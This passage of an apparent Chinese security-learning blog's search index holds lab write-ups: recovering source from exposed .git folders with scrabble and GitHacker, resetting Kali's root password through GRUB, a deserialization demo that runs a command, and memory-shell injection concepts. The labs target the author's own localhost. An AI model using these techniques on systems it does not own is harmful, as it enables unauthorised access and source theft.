class="keyword">class</span> <span class="title class_">Client</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException, RemoteException &#123;</span><br><span class="line">        Context namingContext=<span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">        Iservice cserver= (Iservice) namingContext.lookup(<span class="string">&quot;rmi://localhost:8892/server1&quot;</span>);</span><br><span class="line">        Iservice cserver2= (Iservice) namingContext.lookup(<span class="string">&quot;rmi://localhost:8892/server2&quot;</span>);</span><br><span class="line">        System.out.println(cserver.Service(<span class="string">&quot;haha&quot;</span>));</span><br><span class="line">        System.out.println(cserver2.Service(<span class="string">&quot;nihao&quot;</span>));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-实例测试"><a href="#5-实例测试" class="headerlink" title="5.实例测试"></a>5.实例测试</h3><p>先运行ServerTest，再运行Client客户端程序得到以下结果</p><p><img src="image-20230221213627792.png" alt="image-20230221213627792"></p><p>以上内容相当于对大佬的文章进行再理解，重新整理成我自己能理解的样子，另外其中的代码都是按照自己的理解打的，欢迎各位指正。</p><p>可以看一下大佬的文章讲的更为细致</p><p>参考链接<a href="http://blog.csdn.net/guyuealian/article/details/51992182">http://blog.csdn.net/guyuealian/article/details/51992182</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> JavaSec </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SVN泄露</title>
      <link href="/2023/02/01/SVN%E6%B3%84%E9%9C%B2/"/>
      <url>/2023/02/01/SVN%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali永久提升root权限</title>
      <link href="/2023/01/28/kali%E6%B0%B8%E4%B9%85%E6%8F%90%E5%8D%87root%E6%9D%83%E9%99%90/"/>
      <url>/2023/01/28/kali%E6%B0%B8%E4%B9%85%E6%8F%90%E5%8D%87root%E6%9D%83%E9%99%90/</url>
      
        <content type="html"><![CDATA[<h5 id="第一步："><a href="#第一步：" class="headerlink" title="第一步："></a>第一步：</h5><p>开启虚拟机，进入到下面这个界面时，按E</p><p><img src="image-20230128105449594.png" alt="image-20230128105217924"></p><p>进入以下页面<img src="image-20230128105716234.png" alt="image-20230128105716234"></p><h5 id="第二步："><a href="#第二步：" class="headerlink" title="第二步："></a>第二步：</h5><p>找到<strong>linux</strong>这一行将<code>ro quiet splash</code> 修改为 <code>rw quiet splash init=/bin/bash</code></p><p><img src="image-20230128105923289.png" alt="image-20230128105923289"></p><h5 id="第三步："><a href="#第三步：" class="headerlink" title="第三步："></a>第三步：</h5><p>按F10进入单用户模式<br>执行<code>passwd root</code>命令修改root密码</p><p><img src="image-20230128110240241.png" alt="image-20230128110240241"></p><p>修改成功后重启kali</p><h5 id="第四步："><a href="#第四步：" class="headerlink" title="第四步："></a>第四步：</h5><p>使用刚刚修改的密码进行登录</p><p><img src="image-20230128110629130.png" alt="image-20230128110629130"></p><p><img src="image-20230128110708458.png" alt="image-20230128110708458"></p><p>成功！</p>]]></content>
      
      
      
        <tags>
            
            <tag> kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>信息搜集学习</title>
      <link href="/2023/01/26/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/01/26/%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p>跟着从0到1这本书学习一下，大部分都笼统学过一些，但碍于不够系统，现在想要拾起来，从头再来罢了，欢迎各位一起监督学习</p><h1 id="1-1举足轻重的信息搜集"><a href="#1-1举足轻重的信息搜集" class="headerlink" title="1.1举足轻重的信息搜集"></a>1.1举足轻重的信息搜集</h1><h2 id="信息搜集的分类"><a href="#信息搜集的分类" class="headerlink" title="信息搜集的分类"></a>信息搜集的分类</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">敏感目录</span><br><span class="line"></span><br><span class="line">敏感备份文件</span><br><span class="line"></span><br><span class="line">Banner识别</span><br></pre></td></tr></table></figure><h2 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h2><p>通过敏感目录泄露，我们网袜给能获取网站的源代码和敏感的URL地址<br>如网站的后台地址等。</p><h3 id="1-git泄露"><a href="#1-git泄露" class="headerlink" title="1.git泄露"></a>1.git泄露</h3><p>【漏洞简介】：git是一个主流的分布式版本控制系统，开发人员在开发过程中经常会遗忘.git文件夹，导致攻击者可以从.git文件夹中的信息获取开发人员在开发过程中提交过的所有源码，进而导致服务器被攻击而沦陷</p><h4 id="（1）常规git泄露"><a href="#（1）常规git泄露" class="headerlink" title="（1）常规git泄露"></a>（1）常规git泄露</h4><p>【使用工具】：scrabble:<a href="https://github.com/denny0223/scrabble">denny0223/scrabble: Simple tool to recover .git folder from remote server (github.com)</a></p><p>首先<strong>本地搭建web环境</strong>,这里使用的是自己的kali虚拟机</p><h5 id="1-安装apache2服务"><a href="#1-安装apache2服务" class="headerlink" title="1.安装apache2服务"></a>1.安装apache2服务</h5><p>使用<code>apt-get install apache2</code>安装apache2的服务</p><p><img src="image-20230128112331180.png" alt="image-20230128112331180"></p><p>可以使用<code>service apache2 start</code>开启apache2服务<br>同样使用<code>service apache2 status</code>查看apache2服务是否开启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start //开启服务</span><br><span class="line">service apache2 status //查看服务状态</span><br><span class="line">service apache2  stop //停止服务</span><br></pre></td></tr></table></figure><p>如下图为开启状态</p><p><img src="image-20230128112658874.png" alt="image-20230128112658874"></p><p>使用浏览器打开127.0.0.1查看得到以下界面</p><p><img src="image-20230128113218985.png" alt="image-20230128113218985"></p><p>然后使用ifconfig查一下IP地址</p><p><img src="image-20230128113404350.png" alt="image-20230128113404350"></p><p>再次使用浏览器访问刚刚查到的自己的ip（上图白色部分位置）得到同样页面<br><img src="image-20230128113549628.png" alt="image-20230128113549628"></p><p>进行下一步</p><h5 id="2-创建一个git-test文件夹-并搭建实验场景"><a href="#2-创建一个git-test文件夹-并搭建实验场景" class="headerlink" title="2.创建一个git_test文件夹,并搭建实验场景"></a>2.创建一个git_test文件夹,并搭建实验场景</h5><p>进入<code>var/www/html</code>中创建一个git_test文件夹</p><p><img src="image-20230128114513598.png" alt="image-20230128114513598"></p><p>初始化git仓库 <code>git init</code></p><p><img src="image-20230128121207216.png" alt="image-20230128121207216"></p><p>创建flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">touch flag.php //创建flag.php文件</span><br><span class="line">vim flag.php //编辑flag.php文件，随便输入一些内容</span><br><span class="line">git add flag.php // 添加flag.php到文件暂存区</span><br></pre></td></tr></table></figure><p><img src="image-20230128121238417.png" alt="image-20230128121238417"></p><p><strong><u>（ps：this is flag hhhh是我自己输入的内容）</u></strong></p><p>然后提交修改<code>git commit  -m  &quot;flag&quot;</code></p><p><img src="image-20230128121311790.png" alt="image-20230128121311790"></p><p>这里我没有设置邮箱和用户名，不过影响不大，实验场景搭建完成</p><h5 id="3-获取scrabble工具，运行工具得到flag"><a href="#3-获取scrabble工具，运行工具得到flag" class="headerlink" title="3.获取scrabble工具，运行工具得到flag"></a>3.获取scrabble工具，运行工具得到flag</h5><p>此时回到当前用户目录<code>cd ~</code></p><p>使用<code>git clone https://github.com/denny0223/scrabble.git</code></p><p>将工具克隆到本地</p><p><img src="image-20230128121342190.png" alt="image-20230128121342190"></p><p>发现多了一个scrabble文件夹，进入，使用工具</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">使用方法：scrabble &lt;url&gt;</span><br><span class="line">示例：scrabble http://example.com/</span><br></pre></td></tr></table></figure><p>使用工具，目标为我们刚刚搭建的git_test</p><p><code>./scrabble http://127.0.0.1/git_test/</code></p><p><img src="image-20230128120959386.png" alt="image-20230128120959386"></p><p>使用命令<code>ls</code>得到<strong>flag.php</strong><br>使用<code>cat flag.php</code> 命令得到flag</p><p><img src="image-20230128122116935.png" alt="image-20230128122116935"></p><h4 id="（2）git回滚"><a href="#（2）git回滚" class="headerlink" title="（2）git回滚"></a>（2）git回滚</h4><p>【原理】：git作为版本控制工具，会记录每次提交（commit）的修改所以当存在git泄露时，敏感信息可能被删除或者被覆盖了，这时我们可以利用git的<code>git reset</code>命令恢复到以前的版本</p><p>【环境复现】：</p><p>我们重新提交一个新的版本的flag.php</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;flag is old &quot; &gt; flag.php //修改flag.php的内容</span><br><span class="line">cat flag.php //获取flag.php的内容</span><br><span class="line">git add flag.php //添加flag.php到文件暂存区</span><br><span class="line">git commit -m &quot;old&quot; //提交</span><br></pre></td></tr></table></figure><p><img src="image-20230128151641338.png" alt="image-20230128151641338"></p><p>此时flag.php的内容为：</p><p><img src="image-20230128152126614.png" alt="image-20230128152126614"></p><p>【版本回调】：我们先使用scrabble工具获取源码（回到scrabble文件夹）</p><p><img src="image-20230128154349821.png" alt="image-20230128154349821"></p><p><strong><u>（ps：突然发现这个工具用完就没了，不知道有什么解决方法，所以推荐下载一个压缩包，每次使用都解压一次，这里是删了重下的）</u></strong></p><p>获取源码：</p><p><img src="image-20230128154551483.png" alt="image-20230128154551483"></p><p>再通过 <code>git reset --hard HEAD^</code>命令跳到上一版本（在git中，用HEAD表示当前版本，上一个版本是HEAD^），即可获取到源码</p><p><img src="image-20230128154630452.png" alt="image-20230128154630452"></p><p>另外可以使用 <code>git log</code>可以查看提交历史记录并可以使用<code>git reset --hard [commit id]</code>来回退到相应版本</p><p><img src="image-20230128202835665.png" alt="image-20230128202835665"></p><p><strong><u>（ps：commit id为划线部分，可以只使用前几位，系统会自己匹配，如下图）</u></strong></p><p>使用<code>git reflog</code>查看历史每一次命令，并且可以看到每次提交的commit id （<strong>精简版</strong>）搭配版本回退命令，可以达到类似的效果（如下图）</p><p><img src="image-20230128160508603.png" alt="image-20230128160508603"></p><p>命令总结：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git reflog //查看历史命令</span><br><span class="line">git reset --hard xxx //回退版本 HEAD代表当前版本 HEAD^代表上一版本 HEAD~100表示回退100个版本</span><br><span class="line">git log //查看提交历史记录</span><br></pre></td></tr></table></figure><h5 id="（3）git分支"><a href="#（3）git分支" class="headerlink" title="（3）git分支"></a>（3）git分支</h5><p>【原理】：git允许使用多个分支，从而使用户可以把工作从开发主线上分离出来，以免影响开发主线，如果没有新建分支，那么只有一条时间线，即只有一个分支，默认为master。因此敏感文件可能藏在别的分支中，使用git log只能看到当前分支的提交历史，无法看到其他分支的信息，而大多数git泄露都不支持切换分支，因此需要用到新的工具<a href="https://github.com/WangYihang/GitHacker">GitHacker</a></p><p>这里书里没有过多赘述，并且描述并不详细，不过还是要自己复现一下，以加深印象</p><p>【环境复现】：使用<code>git branch</code> 可以查看分支，此时只有master</p><p>使用 <code>git branch dev</code>创建一个名为dev的分支（<strong>名字随意</strong>）</p><p>再次查看分支，此时有两个分支：master和dev，此时master有<strong>*标并且颜色为绿色</strong>代表此时处在master分支，如下图：</p><p><img src="image-20230128210339890.png" alt="image-20230128210339890"></p><p>使用<code>git checkout dev</code>命令可以切换到dev分支</p><p>此时修改flag.php的内容为flag{new flag is here}</p><p><img src="image-20230128210907463.png" alt="image-20230128210907463"></p><p>git二连（加入暂存区，提交）如下图：</p><p><img src="image-20230128211151702.png" alt="image-20230128211151702"></p><p>使用<code>git checkout master</code>回到master页面。发现flag.php的内容仍为原来的，环境搭建完成！</p><p><img src="image-20230128213658558.png" alt="image-20230128213658558"></p><p>接下来进行复现漏洞：</p><p>首先安装工具<code>python3 -m pip install -i https://pypi.org/simple/ GitHacker</code></p><p><img src="image-20230128213221099.png" alt="image-20230128213221099"></p><p>安装成功后便可以直接使用githacker命令了 <code>githacker --url http://127.0.0.1/git_test/.git --output-folder result</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">githacker --url http://127.0.0.1/git_test/.git --output-folder result</span><br><span class="line">//--url 后面跟url与scrabble不同的是，git hacker需要将.git路径加上</span><br><span class="line">//--output-folder xxx 表示结果将要输出到result文件夹中</span><br></pre></td></tr></table></figure><p><img src="image-20230128214149062.png" alt="image-20230128214149062"></p><p>执行命令后，在目录里生成了一个result文件夹，进入最里面的路径发现有一个flag.php打开发现内容为</p><p><img src="image-20230128214350931.png" alt="image-20230128214350931"></p><p>内容正是master分支下的flag.php的内容，使用<code>git reflog</code>看到是从tmp文件中clone出来的</p><p><img src="image-20230128215450007.png" alt="image-20230128215450007"></p><p>我们找到那个临时文件夹 使用<code>git reflog</code>命令可以看到所有的checkout信息</p><p><img src="image-20230128215605655.png" alt="image-20230128215605655"></p><p>之后就可以切换到dev分支找到flag</p>]]></content>
      
      
      <categories>
          
          <category> 从0到1 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo使用指南</title>
      <link href="/2022/12/17/hexo%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/"/>
      <url>/2022/12/17/hexo%E4%BD%BF%E7%94%A8%E6%8C%87%E5%8D%97/</url>
      
        <content type="html"><![CDATA[<p>1.在本地创建文章</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new &quot;文章标题&quot;</span><br></pre></td></tr></table></figure><p>2.生成发布</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo g #生成页面</span><br><span class="line"></span><br><span class="line">hexo d #部署发布</span><br></pre></td></tr></table></figure><p>3.预览页面</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo s #在本地生成预览页面</span><br></pre></td></tr></table></figure><p>4.在source目录下，执行下面命令，建立标签页</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo new page &quot;tags&quot; </span><br></pre></td></tr></table></figure><p>5.在hexo文章中插入图片</p><p>在<code>config.yaml</code>文件中更改一下配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>此时创建文章会生成新的同名文件夹，但引用却很麻烦</p><p>因此要使用插件<a href="https://link.zhihu.com/?target=https%3A//github.com/hexojs/hexo-renderer-marked">hexo-renderer-marked</a></p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-renderer-marked</span><br></pre></td></tr></table></figure><p>进行安装，之后</p><p>在<code>config.yaml</code>文件中更改一下配置：</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">post_asset_folder:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">marked:</span></span><br><span class="line">  <span class="attr">prependRoot:</span> <span class="literal">true</span></span><br><span class="line">  <span class="attr">postAsset:</span> <span class="literal">true</span></span><br></pre></td></tr></table></figure><p>在typora中系修改如下配置（文件—-偏好设置）</p><p><img src="1.png" alt="1"></p><p>这样无论是插入的本地图片还是网络图片都会变为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">![](文章名/图片)</span><br></pre></td></tr></table></figure><p>的样式</p><p>解决！</p>]]></content>
      
      
      
        <tags>
            
            <tag> 使用指南 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>log4j2漏洞复现</title>
      <link href="/2022/06/21/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/06/21/log4j2%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>内存马学习</title>
      <link href="/2022/06/16/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/"/>
      <url>/2022/06/16/%E5%86%85%E5%AD%98%E9%A9%AC%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h4 id="Java反射"><a href="#Java反射" class="headerlink" title="Java反射"></a>Java反射</h4><p>正常类的加载过程：(以Student类为例)</p><blockquote><p>1.当执行new Student()时，会触发JVM加载Student.class文件<br>2.JVM从本地磁盘找到Sudent.class文件并加载到JVM内存中<br>3.class文件加载后，JVM会自动创建一个class对象，一个类只能产生一个class对象</p></blockquote><p>Java反射的本质：</p><blockquote><p>在内存中得到class对象，反向获取Student对象的信息</p></blockquote><p>Java反射的步骤：</p><blockquote><ul><li>获取目标类型的Class对象</li><li>通过 Class 对象分别获取Constructor类对象、Method类对象 &amp; Field 类对象</li><li>通过 Constructor类对象、Method类对象 &amp; Field类对象分别获取类的构造函数、方法&amp;属性的具体信息，并进行后续操作</li></ul></blockquote><h4 id="Java-Instrumentation"><a href="#Java-Instrumentation" class="headerlink" title="Java Instrumentation"></a>Java Instrumentation</h4><blockquote><p>Instrumentation是Java提供的一个来自JVM的接口，该接口提供了一系列查看和操作Java类定义的方法，例如修改类的字节码、向classLoader的classpath下加入jar文件等，使得开发者可以通过Java语言来操作和监控JVM内部的一些状态，进而实现Java程序的监控分析，甚至实现一些特殊功能（如AOP、热部署）</p><p>Java agent 通过Instrumentation API与JVM交互</p></blockquote><p>在注入<a href="https://so.csdn.net/so/search?q=内存&amp;spm=1001.2101.3001.7020">内存</a>马的过程中，我们可以利用java Instrumentation机制，动态的修改已加载到内存中的类里的方法，进而注入恶意的代码</p><h4 id="内存马类型"><a href="#内存马类型" class="headerlink" title="内存马类型"></a>内存马类型</h4><ul><li>servlet-api类：filter型、servlet型、listener型</li><li>spring类：interceptor型、controller型</li><li>Java Instrumentation类：agent型</li></ul><h4 id="内存马简介"><a href="#内存马简介" class="headerlink" title="内存马简介"></a>内存马简介</h4><p><strong>目标</strong>：访问url或指定url，带上命令执行参数，即可让服务器返回执行结果</p><p><strong>实现</strong>：以java为例，客户端发起的web请求会依次经过Listener、Filter、Servlet三个组件，我们只要在这个请求的过程中做手脚，在内存中修改已有的组件或者动态注册一个新的组件，插入恶意的shellcode，就可以达到我们的目的</p><h4 id="内存码原理与实现："><a href="#内存码原理与实现：" class="headerlink" title="内存码原理与实现："></a>内存码原理与实现：</h4><p>实现：</p><p>servlet型：创建一个恶意的servlet，获取当前的standardcontext，将恶意servlet封装成wapper添加到StandardContext的child中，添加servletMapping将访问的URL和wapper进行绑定</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JAVA反序列化漏洞浅析</title>
      <link href="/2022/06/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
      <url>/2022/06/15/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h4 id="JAVA反序列化与ObjectInputStream"><a href="#JAVA反序列化与ObjectInputStream" class="headerlink" title="JAVA反序列化与ObjectInputStream"></a>JAVA反序列化与ObjectInputStream</h4><p>关于ObjectOutputStream：</p><blockquote><p>ObjectOutputStream:对象的<strong>序列化流</strong>，作用：把对象转成字节数据的输出到文件中保存，对象的输出过程称为<strong>序列化</strong>，可实现对象的持久存储。</p></blockquote><p>关于ObjectInputStream：</p><blockquote><p>ObjectInputStream <strong>反序列化流</strong>，将之前使用 ObjectOutputStream 序列化的原始数据恢复为对象，以流的方式读取对象。 </p></blockquote><p>在JAVA中，利用ObjectinputStream的readObject方法进行对象读取时，如果，目标对象已经重写了readObject方法，那么此时就会执行已经被重写的readObject如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//创建一个MyObj类，此时MyObj类需要继承Serializable才能进行序列化和反序列化</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyObj</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line"><span class="keyword">private</span> String name;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(java.io.ObjectInputStream in)</span> <span class="keyword">throws</span> Exception, IOException &#123;</span><br><span class="line"><span class="comment">// TODO Auto-generated method stub</span></span><br><span class="line">in.defaultReadObject();</span><br><span class="line">Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);<span class="comment">//执行calc命令</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">return</span> name;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line"><span class="built_in">this</span>.name = name;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//main方法，将新的MyObj对象序列化后写入object文件，之后反序列化后再读取出来</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">MyObj o=<span class="keyword">new</span> <span class="title class_">MyObj</span>();</span><br><span class="line">o.setName(<span class="string">&quot;haha wocao&quot;</span>);</span><br><span class="line">FileOutputStream fos=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">ObjectOutputStream os=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">os.writeObject(o);</span><br><span class="line">os.close();</span><br><span class="line">FileInputStream fis=<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;object&quot;</span>);</span><br><span class="line">ObjectInputStream ois=<span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fis);</span><br><span class="line">MyObj o1=(MyObj) ois.readObject();</span><br><span class="line">System.out.println(o1.getName());</span><br><span class="line">ois.close();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>点击运行后，发现输出了“haha wocao”并执行了calc命令</p><p><img src="2022-06-15 154047.png" alt=""></p><p>可见在反序列化时，可能会给恶意代码提供可乘之机<br>如果反序列化执行的是恶意构造的字节序列，那么漏洞就产生了</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞原理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>shiro漏洞复现</title>
      <link href="/2022/06/14/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/06/14/shiro%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞复现 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
    
    
    <entry>
      <title>关于我</title>
      <link href="/about/index.html"/>
      <url>/about/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>分类</title>
      <link href="/categories/index.html"/>
      <url>/categories/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>游戏精彩时刻</title>
      <link href="/game/index.html"/>
      <url>/game/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>标签</title>
      <link href="/tags/index.html"/>
      <url>/tags/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
    
    <entry>
      <title>我的豆瓣</title>
      <link href="/movies/index.html"/>
      <url>/movies/index.html</url>
      
        <content type="html"><![CDATA[]]></content>
      
    </entry>
    
    
  
</search>
